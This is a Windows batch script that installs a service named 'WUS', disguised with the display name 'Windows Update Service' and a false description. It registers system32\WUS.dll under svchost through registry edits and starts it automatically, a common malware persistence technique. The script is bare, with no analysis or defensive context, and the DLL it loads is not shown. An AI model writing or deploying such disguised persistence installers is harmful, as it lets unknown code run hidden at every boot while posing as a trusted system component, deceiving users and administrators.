@echo off
sc create WUS binPath= "%SystemRoot%\system32\svchost.exe -k WUS" type= share start= auto DisplayName= "Windows Update Service"
sc description WUS "Provides windows update services for virtual devices."
reg add HKLM\SYSTEM\CurrentControlSet\services\WUS\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\WUS.dll /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v WUS /t REG_MULTI_SZ /d WUS /f
sc start WUS